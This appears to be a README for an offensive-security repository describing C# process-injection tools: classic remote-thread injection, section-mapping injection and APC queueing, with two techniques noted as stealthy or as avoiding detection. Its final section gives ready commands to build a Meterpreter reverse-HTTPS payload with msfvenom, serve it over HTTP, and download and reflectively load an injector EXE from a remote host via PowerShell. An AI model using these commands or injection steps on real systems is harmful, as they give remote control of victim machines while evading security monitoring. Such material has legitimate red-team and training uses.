## **NativeProcInjection.cs**

This technique demonstrates classic process injection using Native Windows API functions. It creates a remote process (usually `notepad.exe`), allocates memory in it, writes shellcode, and creates a remote thread to execute the payload.

**High-Level Steps:**
1. Launch a target process in suspended or running state (e.g., `CreateProcess`).
2. Allocate memory in the remote process using `VirtualAllocEx`.
3. Write the shellcode to the allocated memory using `WriteProcessMemory`.
4. Create a new thread in the remote process pointing to the shellcode with `CreateRemoteThread`.

---

## **NtMapInjection.cs**

This method utilizes NT native APIs to create a shared memory section and map it into both the local and remote process. It’s stealthier than the classic method and avoids using easily-monitored APIs like `WriteProcessMemory`.

**High-Level Steps:**
1. Create a memory section using `NtCreateSection`.
2. Map the section into the local process using `NtMapViewOfSection`.
3. Copy the shellcode into the local view.
4. Map the same section into the remote process using `NtMapViewOfSection`.
5. Create a remote thread in the target process with `CreateRemoteThread` or equivalent to execute the code.

---

## **NtQueueApc.cs**

This method uses Asynchronous Procedure Calls (APCs) to queue execution of shellcode in the context of a thread in a remote process. It is often used in combination with other techniques to delay execution or avoid detection.

**High-Level Steps:**
1. Open a handle to the target process and a thread within it.
2. Allocate memory in the target process and write the shellcode using `VirtualAllocEx` and `WriteProcessMemory`.
3. Use `NtQueueApcThread` to queue a call to the shellcode in the remote thread.
4. Resume the thread if it's suspended, so the APC can be delivered and executed.

## **TryHarder.cs**

Another Process Injection technique that loads the shellcode remotely.<br>
The idea of this technique is by `Sektor 7` and ported to C# by [saulgoodman](https://github.com/saulg00dmin).

Create Shellcode using msfvenom:<br>
- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin`

Serve the `shellcode.bin` with python server: `python3 -m http.server 80`

Convert the EXE into a byte array:<br>
- `$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.190/Tryharder.exe')`

Load the EXE into memory:<br>
- `$assem = [System.Reflection.Assembly]::Load($data)`

Invoke its entry point:
- `$assem.EntryPoint.Invoke($null, @([string[]]@()))`
